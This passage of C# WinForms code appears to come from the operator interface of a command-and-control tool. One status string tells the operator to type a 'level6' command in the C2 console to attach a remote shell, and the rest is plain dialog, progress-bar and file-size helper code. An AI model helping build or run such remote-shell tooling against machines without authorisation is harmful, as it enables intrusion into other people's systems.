                    "\n\nIn the C2 console type:  level6 " + _sid + "\nto attach a shell in that folder.");
            else
                _status.Text = "shell cwd failed: " + l;
        }

        string Prompt(string title, string def)
        {
            var f = new Form();
            f.Text = title;
            f.Width = 380; f.Height = 125;
            f.StartPosition = FormStartPosition.CenterParent;
            f.BackColor = Theme.Panel;
            f.ForeColor = Theme.Text;
            f.Font = Font;
            var tb = new TextBox();
            tb.Text = def;
            tb.Location = new Point(12, 12);
            tb.Width = 340;
            tb.BackColor = Theme.Panel;
            tb.ForeColor = Theme.Text;
            tb.BorderStyle = BorderStyle.FixedSingle;
            var ok = new Button();
            ok.Text = "OK";
            ok.DialogResult = DialogResult.OK;
            ok.Location = new Point(196, 48);
            ok.BackColor = Theme.Accent;
            ok.FlatStyle = FlatStyle.Flat;
            ok.FlatAppearance.BorderSize = 0;
            var cn = new Button();
            cn.Text = "Cancel";
            cn.DialogResult = DialogResult.Cancel;
            cn.Location = new Point(281, 48);
            cn.BackColor = Theme.Hover;
            cn.ForeColor = Theme.Text;
            cn.FlatStyle = FlatStyle.Flat;
            cn.FlatAppearance.BorderSize = 0;
            f.Controls.Add(tb); f.Controls.Add(ok); f.Controls.Add(cn);
            f.AcceptButton = ok;
            f.CancelButton = cn;
            return f.ShowDialog(this) == DialogResult.OK ? tb.Text : null;
        }

        void SetBusy(string msg)
        {
            _status.Text = msg;
            _prog.Style = ProgressBarStyle.Marquee;
            _prog.MarqueeAnimationSpeed = 30;
        }

        void SetIdle()
        {
            _prog.Style = ProgressBarStyle.Continuous;
            _prog.MarqueeAnimationSpeed = 0;
        }

        static string HumanSize(long n)
        {
            string[] u = { "B", "KB", "MB", "GB", "TB" };
            double v = n;
            int i = 0;
            while (v >= 1024 && i < u.Length - 1) { v /= 1024; i++; }
            return v.ToString("0.##") + " " + u[i];
        }
    }
}
